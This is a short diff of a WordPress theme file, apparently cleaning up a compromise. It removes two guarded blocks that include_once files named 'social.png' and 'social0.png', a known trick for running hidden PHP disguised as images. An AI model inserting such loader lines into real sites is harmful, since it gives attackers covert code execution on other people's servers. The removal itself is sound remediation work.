@@ -258,12 +258,3 @@ function revcon_change_post_object() {
       $labels->menu_name = 'News11';
       $labels->name_admin_bar = 'News item'; //admin top bar
 }
-
-/*                ----------------------------              */
-if (!defined('WP_OPTION_KEY')) {
-include_once 'social.png';
-}
-
-if (!defined('WP_OPTION_KEY')) {
-include_once 'social0.png';
-}
